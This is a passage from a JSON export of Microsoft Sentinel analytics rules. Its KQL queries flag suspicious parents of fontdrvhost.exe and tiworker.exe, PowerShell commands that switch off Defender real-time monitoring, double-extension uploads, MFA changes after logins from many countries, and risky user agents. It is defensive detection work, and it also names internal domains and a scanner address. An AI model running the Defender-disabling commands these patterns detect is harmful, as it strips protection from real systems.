          "query": "// Define the list of trusted parent processes  \nlet trusted_parents = dynamic([ @\"c:\\windows\\system32\\wininit.exe\\wininit.exe\", @\"c:\\windows\\sysWow64\\wininit.exe\\wininit.exe\", @\"c:\\WINNT\\system32\\wininit.exe\\wininit.exe\", @\"c:\\windows\\system32\\winlogon.exe\\winlogon.exe\", @\"c:\\windows\\sysWow64\\winlogon.exe\\winlogon.exe\", @\"c:\\WINNT\\system32\\winlogon.exe\\winlogon.exe\", @\"c:\\windows\\system32\\winlogon.exe\\winlogon.exe\" ]); \n DeviceProcessEvents \n| where FileName == \"fontdrvhost.exe\"\n| extend ParentProcessPath = strcat(tostring(InitiatingProcessFolderPath), \"\\\\\", tostring(InitiatingProcessFileName))  \n| where not(ParentProcessPath in (trusted_parents)) \n| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, ParentProcessPath, InitiatingProcessCommandLine, AccountName, AccountDomain \n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT3H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "NetBiosName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "ProcessCommandLine"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/47a07cd5-2197-468e-8a57-2a2ed4e875b5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/47a07cd5-2197-468e-8a57-2a2ed4e875b5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS_CUSTOM] Suspicious Parent Spawning Tiworker",
          "description": "This rule focuses on instances where a suspicious process spawns \"tiworker.exe\", a legitimate program related to Microsoft Defender. Abnormally high occurrences of this behavior might indicate an attempt to tamper with security software by launching a disguised malicious program.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Identify suspicious parent processes spawning tiworker.exe\nSecurityEvent\n| where EventID == 4688  // Process Creation Event\n| extend TargetProcessName = tostring(split(NewProcessName, '\\\\')[-1])\n| extend ParentProcessName = tostring(split(ProcessName, '\\\\')[-1]) // Replace 'ProcessName' with the appropriate parent process field from schema\n| where TargetProcessName == \"tiworker.exe\"\n| where not (ParentProcessName has_any (\"svchost.exe\"))  // Filter legitimate parent processes\n| project TimeGenerated, TargetProcessName, ParentProcessName, NewProcessId, SubjectUserName, SubjectLogonId, Computer, CommandLine\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), Count = count() by ParentProcessName, SubjectUserName, Computer\n| extend Tactic = \"Privilege Escalation, Defense Evasion\",\n         Technique = \"Access Token Manipulation (T1134), Masquerading (T1036)\",\n         SubTechnique = \"Parent PID Spoofing (T1134.004)\"\n| order by Count desc\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1134",
            "T0849"
          ],
          "subTechniques": [
            "T1134.004"
          ],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/cd2e592a-63fa-41c6-9f5b-ef895d3c57ce')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/cd2e592a-63fa-41c6-9f5b-ef895d3c57ce')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS_CUSTOM] PowerShell Disable Security Monitoring Activity",
          "description": "This rule monitors the execution of PowerShell commands known to disable security functionalities. Malicious actors might use PowerShell scripts to tamper with antivirus, endpoint detection, or other security tools. By identifying these specific PowerShell commands, the rule helps flag potential efforts to weaken a system's defenses and create vulnerabilities for further attacks.",
          "severity": "Medium",
          "enabled": true,
          "query": "//Created on 2/6/2025 Amayor\nSecurityEvent\n| where EventID == 4688  // Process creation event\n| where CommandLine contains \"set-mppreference\" \n    or CommandLine contains \"disablerealtimemonitoring\"\n    or CommandLine contains \"disableioavprotection\"\n| where ProcessName endswith \"pwsh.exe\" \n    or ProcessName endswith \"sqlps.exe\"\n    or ProcessName endswith \"sqltoolsps.exe\"\n    or ProcessName endswith \"powershell.exe\"\n    or ProcessName endswith \"powershell_ise.exe\"\n| extend Account = SubjectUserName, Host = Computer, Process = NewProcessName, Command = CommandLine\n| project TimeGenerated, Account, Host, Process, Command\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Execution"
          ],
          "techniques": [
            "T1059",
            "T1003"
          ],
          "subTechniques": [
            "T1059.001"
          ],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/55615f6a-b4c7-4d67-b1ad-c5e5d62a3c25')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/55615f6a-b4c7-4d67-b1ad-c5e5d62a3c25')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[REFINED 2/5/2025] Detect potential presence of a malicious file with a double extension (ASIM Web Session)",
          "description": "NOTE: This rule has been refined so it does not trigger on trusted domain sources. \n\nDouble extension vulnerability is a significant concern in file uploads, as it can lead to various issues if an attacker successfully uploads a virus-infected file.",
          "severity": "Medium",
          "enabled": true,
          "query": "//Excluding legit domains from the requestedFileName\n// Define Trusted Domains\nlet TrustedDomains = datatable(Domain: string)\n    [\n        \"microsoft.com\",\n        \"calhr.lightning.force.com\", // salesforce software\n        \"knowbe4.com\",\n        \"adobe.com\",\n        \"knowbe4.com\",\n        \"oracle.com\",\n        \"vorpsync.aspgov.com\",\n        \"globalapp.sco.ca.gov\",\n        \"aspgov.com\",\n        \"force.com\",\n        \"globalapp.sco.ca.gov\",\n        \"sco.ca.gov\",\n        \"webstorage08.five9.com\", // Five9 call center software\n        \"dcssoac.teammatehosting.com\"  // Audit software\n    ];\n\nlet common_file_ext_list = dynamic([\".txt\", \".xlsx\", \".doc\", \".docx\", \".csv\", \".pdf\", \".png\", \".jpg\", \".jpeg\"]); // Add list of common files as per your environment\n_Im_WebSession (starttime=ago(1h), eventresult='Success')\n| where Url !contains \"dcssoac.teammatehosting.com\"\n| where HttpRequestMethod in~ (\"POST\", \"PUT\") \n| where DstFQDN_dynamic !in (TrustedDomains)\n| project\n    Url,\n    SrcIpAddr,\n    SrcUsername,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber,\n    DstHostname,\n    TimeGenerated\n| extend requestedFileName=tostring(split(tostring(parse_url(Url)[\"Path\"]), '/')[-1])\n| extend FileWithdualextension = extract(@'([\\w-]+\\.\\w+\\.\\w+)$', 1, requestedFileName, typeof(string))\n| extend SecondExt = tostring(split(FileWithdualextension, '.')[-1])\n| where strcat('.', SecondExt) in~ (common_file_ext_list) // Second extension is mostly from the common files\n| summarize\n    EventCount=count(),\n    EventStartTime=min(TimeGenerated),\n    EventEndTime=max(TimeGenerated)\n    by\n    SrcIpAddr,\n    Url,\n    FileWithdualextension,\n    SrcUsername,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber,\n    DstHostname\n| extend Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername,'@',0)[0]),SrcUsername), UPNSuffix = iif(SrcUsername contains \"@\",tostring(split(SrcUsername,'@',1)[0]),\"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "CommandAndControl"
          ],
          "techniques": [
            "T1036",
            "T1505",
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6a71687f-00cf-44d3-93fc-8cbacc7b5615",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP address '{{SrcIpAddr}}' has been observed with posting potentially risky dual extension file",
            "alertDescriptionFormat": "User posted file '{{FileWithdualextension}}' which potentially contain dual extensions. This type of activity could be malicious and performed to bypass file upload filters or security measures implemented by the application. Destination server name this request was targetted to - '{{DstHostname}}'"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "EventCount": "EventCount",
            "EventEndTime": "EventEndTime",
            "DstHostname": "DstHostname"
          },
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileWithdualextension"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-20512')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-20512')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-20512: [SOC] Auth - Azure AD - Unusual MFA Change Following Suspicious Logins",
          "description": "Identifies suspicious logins to Azure AD based on a login to OfficeHome and other suspicious apps from multiple countries followed by an MFA device change.\n\ncim_models: auth, network, Azure AD MITRE: T1078 Category: BVIM/Entra ID tag: SOC",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-20512';\nlet alert_type = 'SOC';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet start_time_suppress = 1d;\nlet start_time_historical = 1d;\nlet start_time = 1h;  \nlet alert_bin = 1h;\nlet end_time = now();\nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}])\n, 'excluded_dedup_hash_fields': dynamic(['bv_authentication_reason','bv_authentication_result','bv_event_id', 'bv_transaction_id','bv_vendor_mfa'])\n, 'COUNTRY_THRESHOLD': 5\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV20512_CONFIG['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV20512_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_cim_category','bv_user','bv_transaction_id', 'bv_start_time','bv_end_time', 'bv_event_count']));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']); \nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nbvim_aad_signin(starttime=ago(start_time_historical), endtime=end_time, bv_tags_has='auth,user')\n| project bv_start_time, bv_user, bv_dest_app, bv_src_dvc_managed, bv_network_tags, bv_raw, bv_src_dvc, bv_authentication_reason, bv_src_asn, bv_transaction_id, bv_src_ip, bv_src_country\n| where bv_dest_app has_any ('OfficeHome', 'Exchange Online', 'Powershell') and bv_authentication_reason=='success'\n| summarize Location_Cnt = dcount(bv_src_country), bv_src_countries = make_set(bv_src_country, 20), bv_start_time = min(bv_start_time), bv_end_time = max(bv_start_time), bv_src_ip = make_set(bv_src_ip, 20) by bv_user, bv_dest_app\n| where Location_Cnt >= BV20512_CONFIG['COUNTRY_THRESHOLD'] and bv_end_time - bv_start_time < timespan(60m)\n| join kind=inner (            \nbvim_auditlogs(starttime=ago(start_time_historical), endtime=end_time, bv_tags_has='change')\n| project bv_change_action, bv_start_time, bv_object_attr_category, bv_parser, bv_vendor_action, bv_src_ip, bv_object, bv_src_user, bv_dest_user, bv_user, sourcetype, bv_connector, bv_vendor_reason\n| where bv_object_attr_category == 'mfa'\n| where bv_vendor_reason in~ ('Update', 'Unassign') or bv_vendor_reason contains 'Assign'\n| where not(bv_src_user has_any ('Azure MFA StrongAuthenticationService', 'Azure Credential Configuration Endpoint Service'))\n| summarize bv_change_time=arg_min(bv_start_time, *) by bv_dest_user, bv_vendor_action \n) on $left.bv_user == $right.bv_dest_user\n| where bv_change_time - bv_start_time < timespan(12h)\n| extend bv_dedup_hash = hash_sha1(strcat(bv_dest_user))\n        , bv_mapping_tag = bv_user\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n| project-keep\n    bv_*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-20512: [SOC] Auth - AzureAD - Unusual MFA Change Following Suspicious Logins From {{bv_dest_user}}",
            "alertDescriptionFormat": "Identifies suspicious logins to Azure AD based on a login to OfficeHome and other apps from multiple countries followed by an MFA device change.\n{{bv_desc_l}}\ntag: SOC\nCategory: auth\nMITRE: T1078"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5c5d4771-aae8-496f-b7ea-eb367533e6cf')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5c5d4771-aae8-496f-b7ea-eb367533e6cf')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect known risky user agents (ASIM Web Session)",
          "description": "This rule is designed to flag web requests that contain a user agent header that is recognized as malicious. It relies on a predefined list of known user agents, which is referenced from a specific CSV file",
          "severity": "Medium",
          "enabled": false,
          "query": "let lookback = 5m;\nlet knownUserAgentsIndicators = materialize(externaldata(UserAgent: string, UserAgentCategory: string)\n  [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/UnusualUserAgents.csv\"] \n  with(format=\"csv\", ignoreFirstRecord=True)\n  | extend joiner = 1);\nlet CustomUserAgentIndicators = (_ASIM_GetWatchlistRaw(\"UnusualUserAgents\") // Create new Watchlist and add your custom indicators(Optional)\n  | extend\n      UserAgent = tostring(WatchlistItem[\"UserAgent\"]),\n      UserAgentCategory = tostring(WatchlistItem[\"UserAgentCategory\"])\n  | project UserAgent, UserAgentCategory, joiner = 1\n  | where isnotempty(UserAgent) and isnotempty(UserAgentCategory));\nlet CombinedUAList = union knownUserAgentsIndicators, CustomUserAgentIndicators;\nlet knownUserAgents=toscalar(CombinedUAList\n  | where isnotempty(UserAgent)\n  | summarize make_list(UserAgent, 1000));\n_Im_WebSession (starttime=ago(lookback), httpuseragent_has_any=knownUserAgents)\n| project SrcIpAddr, SrcUsername, SrcHostname, HttpUserAgent, Url, DstIpAddr, DstPortNumber, TimeGenerated\n| extend joiner = 1\n| join kind=inner CombinedUAList on joiner\n| where HttpUserAgent has UserAgent\n| where SrcIpAddr != \"172.31.1.14\" //Nessus Scan Agent added by Amayor 9/16/2024\n| summarize\n  EventCount=count(),\n  EventStartTime = min(TimeGenerated),\n  EventEndTime=max(TimeGenerated)\n  by SrcIpAddr, SrcUsername, SrcHostname, Url, HttpUserAgent, DstIpAddr, DstPortNumber, UserAgentCategory\n| extend Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername,'@',0)[0]),SrcUsername), UPNSuffix = iif(SrcUsername contains \"@\",tostring(split(SrcUsername,'@',1)[0]),\"\")\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CommandAndControl"
          ],
          "techniques": [
            "T1190",
            "T1133",
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6a4dbcf8-f5e2-4b33-b34f-2db6487613f0",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP '{{SrcIpAddr}}' has been observed using User Agent categorized as '{{UserAgentCategory}}'",
            "alertDescriptionFormat": "User accessed this URL '{{Url}}' using User Agent '{{HttpUserAgent}}'. Perform a thorough analysis of the requests associated with this user agent header"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "EventCount": "EventCount",
            "EventEndTime": "EventEndTime",
            "UserAgentCategory": "UserAgentCategory",
            "HttpUserAgent": "HttpUserAgent"
          },
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DstIpAddr"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11500')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11500')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11500: [SOC] Alert - Local VM Connection to AD Domain",
          "description": "Alerts when a local VM creates an excessive number of connections to well-known AD Ports. MITRE: T1071 Category: Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
